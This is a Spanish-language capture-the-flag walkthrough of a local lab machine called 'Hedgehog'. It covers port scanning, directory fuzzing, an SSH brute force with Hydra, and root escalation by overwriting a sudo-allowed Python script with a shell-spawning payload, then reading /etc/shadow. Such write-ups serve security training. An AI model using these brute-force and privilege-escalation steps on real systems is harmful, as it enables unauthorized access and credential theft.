
# Hedgehog

<figure><img src="/files/JoTX5QpRDGknVmJiWqgj" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Despliegue de la máquina</mark>

```bash
sudo bash auto_deploy.sh hedgehog.tar

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2
```

Tenemos la IP: `172.17.0.2`

## <mark style="color:purple;">Primer acceso</mark>

Accedemos través del navegador y llegamos a una default page de Apache:

<figure><img src="/files/EnvKfU8pSyi1cvP1Nkki" alt=""><figcaption></figcaption></figure>

No obtenemos nada relevante, por lo que vamos a escanear los puertos abiertos en esta máquina.

## <mark style="color:purple;">Escaneo de puertos</mark>

```bash
sudo nmap -v -A -sCV -T5 172.17.0.2
```

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f9:f6:fc:f7:f8:4d:d4:74:51:4c:88:23:54:a0:b3:af (ECDSA)
|_  256 fd:5b:01:b6:d2:18:ae:a3:6f:26:b2:3c:00:e5:12:c1 (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.58 (Ubuntu)
```

Solo encontramos 2 puertos abiertos, el 22 y el 80. En principio nada relevante.

## <mark style="color:purple;">Fuzzing</mark>

Haciendo fuzzing con dirsearch nos encontramos un directorio interesante:

```bash
dirsearch -u http://172.17.0.2 -x 301-503

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/reports/http_172.17.0.2/_24-12-11_20-15-26.txt

Target: http://172.17.0.2/

[20:15:26] Starting: 
[20:15:52] 200 -   26B  - /index.php
[20:15:53] 301 -  313B  - /javascript  ->  http://172.17.0.2/javascript/

Task Completed
```

Vamos a acceder a `/index.php` a ver que encontramos.

<figure><img src="/files/u0sBcByHmL97hSuyKFTK" alt=""><figcaption></figcaption></figure>

A priori nos encontramos con lo que podría ser una posible contraseña de algún usuario del sistema. En este punto ya que no tenemos más directorios accesibles, vamos a probar a hacer un bruteforce de SSH para intentar adivinar el usuario.

## <mark style="color:purple;">Bruteforce de SSH</mark>

En este momento puede parecer que no podemos hacer nada, pero vamos a usar ffuf para enumerar subdominios dentro de este host:

```shell-session
afsh4ck@kali$  hydra -L /usr/share/wordlists/rockyou.txt.gz -p JIFGHDS87GYDFIGD ssh://172.17.0.2

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-12-11 20:23:58
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:14344399/p:1), ~896525 tries per task
[DATA] attacking ssh://172.17.0.2:22/

[22][ssh] host: 172.17.0.2   login: carlos   password: JIFGHDS87GYDFIGD
```

Bingo! Obtenemos el usuario de la máquina: `Carlos`

## <mark style="color:purple;">Acceso por SSH</mark>

```shell-session
afsh4ck@kali$ ssh carlos@172.17.0.2

The authenticity of host '172.17.0.2 (172.17.0.2)' can't be established.
ED25519 key fingerprint is SHA256:Hvih5sjfx4Qwfp0rb0aWHkFvIxZbFo+cyOaoqbCHXSI.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.17.0.2' (ED25519) to the list of known hosts.
carlos@172.17.0.2's password: 
Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.11.2-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
carlos@b2a9ee1cf61d:~$ id
uid=1001(carlos) gid=1001(carlos) groups=1001(carlos)
carlos@b2a9ee1cf61d:~$ whoami
carlos
```

Buum! Efectivamente nos conseguimos loguear en la máquina. Ya estamos dentro.

## <mark style="color:purple;">Escalada de privilegios</mark>

Lo primero que vamos a hacer para elevar nuestros privilegios es ver los permisos de ejecución que tenemos en la máquina. Este siempre debería ser el primer paso:

```shell-session
carlos@b2a9ee1cf61d:~$ sudo -l
Matching Defaults entries for carlos on b2a9ee1cf61d:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User carlos may run the following commands on b2a9ee1cf61d:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/script.py
```

Observamos que Carlos puede ejecutar el script `/opt/script.py` con privilegios de superusuario. Vamos a ver el contenido del script:

```shell-session
carlos@b2a9ee1cf61d:/home$ cat /opt/script.py 
import shutil

def copiar_archivo(origen, destino):
    shutil.copy(origen, destino)
    print(f'Archivo copiado de {origen} a {destino}')

if __name__ == '__main__':
    origen = '/opt/script.py'
    destino = '/tmp/script_backup.py'
    copiar_archivo(origen, destino)
```

SIempre que tenemos permisos de ejecución sobre algún archivo deberíamos consultar GTFOBins para encontrar una manera efectiva de elevar nuestros privilegios. Como el ejecutable es en python vamos a la sección Python.

{% embed url="<https://gtfobins.github.io/gtfobins/python/#sudo>" %}

Concretamente en la sección SUDO encontramos una forma para elevar nuestros privilegios:

> SUDO

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```bash
sudo python -c 'import os; os.system("/bin/sh")'
```

Con esta pista podemos modificar nuestro script en python. El usuario Carlos no puede ejecutar sudo en la máquina, por lo que vamos a dar permisos al ejecutable y ya lo podemos editar:

```shell-session
carlos@b2a9ee1cf61d:/home$ sudo nano /opt/script.py 
[sudo] password for carlos: 
Sorry, user carlos is not allowed to execute '/usr/bin/nano /opt/script.py' as root on b2a9ee1cf61d.
```

```shell-session
carlos@b2a9ee1cf61d:/home$ chmod 777 /opt/script.py 
carlos@b2a9ee1cf61d:/home$ nano /opt/script.py 
```

Ahora vamos a eliminar todo el contenido del script y poner lo siguiente:

{% code title="script.py" %}

```python
import os
os.system("/bin/sh")
```

{% endcode %}

Lo guardamos y lo ejecutamos con sudo, y ya somos root!

```shell-session
carlos@b2a9ee1cf61d:/home$ sudo python3 /opt/script.py
# id
uid=0(root) gid=0(root) groups=0(root)
# whoami
root
```

Aquí ya podríamos hace run tratamiento de la TTY para movernos mejor y acceder a cualquier archivo del sistema:

```shell-session
# python3 -c 'import pty;pty.spawn("/bin/bash")'
root@b2a9ee1cf61d:/home# export TERM=xterm
```

Por ejemplo podríamos acceder al `/etc/shadow` donde están todas las contraseñas crackeadas en sistemas Linux:

```shell-session
root@b2a9ee1cf61d:~# cat /etc/shadow

root:*:19842:0:99999:7:::
daemon:*:19842:0:99999:7:::
bin:*:19842:0:99999:7:::
sys:*:19842:0:99999:7:::
sync:*:19842:0:99999:7:::
games:*:19842:0:99999:7:::
man:*:19842:0:99999:7:::
lp:*:19842:0:99999:7:::
mail:*:19842:0:99999:7:::
news:*:19842:0:99999:7:::
uucp:*:19842:0:99999:7:::
proxy:*:19842:0:99999:7:::
www-data:*:19842:0:99999:7:::
backup:*:19842:0:99999:7:::
list:*:19842:0:99999:7:::
irc:*:19842:0:99999:7:::
_apt:*:19842:0:99999:7:::
nobody:*:19842:0:99999:7:::
ubuntu:!:19842:0:99999:7:::
systemd-network:!*:19850::::::
systemd-timesync:!*:19850::::::
messagebus:!:19850::::::
systemd-resolve:!*:19850::::::
sshd:!:19850::::::
carlos:$y$j9T$miY.A/R.6yu.FUX0sqhhh1$7OKNoU1zFaBvQKoRSwZzjN9qMAORhPuoogeX5lECdW0:19850:0:99999:7:::
```
